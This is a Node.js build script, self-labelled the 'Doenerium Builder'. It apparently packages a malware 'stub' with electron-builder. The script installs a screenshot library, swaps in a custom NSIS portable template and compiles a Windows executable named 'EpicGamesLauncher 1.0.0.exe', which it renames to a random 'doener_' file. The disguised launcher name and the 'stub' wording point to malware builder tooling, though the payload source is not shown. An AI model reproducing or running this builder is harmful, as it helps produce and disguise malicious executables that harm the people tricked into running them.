const fs = require('fs').promises;
const path = require('path');
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

async function makeid_var(length) {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz1234567890';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

function notifySuccess(message) {
    console.log('\x1b[32m%s\x1b[0m', message);
}

function notifyError(message) {
    console.error('\x1b[31m%s\x1b[0m', message);
}

async function main() {
    const CURRENT_DIR = process.cwd();
    const start = Date.now();

    try {
	await exec('npm install screenshot-desktop');
        console.log('Installing dependencies...');
        await exec('npm i');

        const oldNsiPath = path.join(process.cwd(), 'node_modules', 'app-builder-lib', 'templates', 'nsis', 'portable.nsi');
        try {
            await fs.unlink(oldNsiPath);
            notifySuccess('Successfully deleted old portable.nsi.');
        } catch (error) {
            if (error.code === 'ENOENT') {
                notifySuccess('Old portable.nsi does not exist. Skipping deletion.');
            } else {
                notifyError('Error deleting old portable.nsi:', error.message);
            }
        }

        const newNsiPath = path.join(process.cwd(), 'portable.nsi');
        await fs.copyFile(newNsiPath, oldNsiPath);
        notifySuccess('Copied new portable.nsi.');

        notifySuccess('npm install success!');

        const randomid = await makeid_var(8);

        const { stdout, stderr } = await exec('npm run electron-builder --win');

        if (stderr) {
            notifyError('Compilation failed!', stderr);
            await exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Compilation failed!\\n${stderr}', 'Error', 'OK', 'Error')"`);
        } else {
            notifySuccess('Compilation success!');

            const outputFilename = `doener_${randomid}.exe`;
            const oldFilePath = path.join(CURRENT_DIR, 'build', 'EpicGamesLauncher 1.0.0.exe');
            const newFilePath = path.join(CURRENT_DIR, 'build', outputFilename);
            await fs.rename(oldFilePath, newFilePath);

            notifySuccess(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}`);
            await exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}', 'Doenerium Builder', 'OK', 'Information')"`);
            await exec(`start explorer "${path.join(CURRENT_DIR, 'build')}"`);
            
        }

    } catch (error) {
        notifyError('Error:', error.message);
    }

    console.log('Press any key to continue...');
}

main();
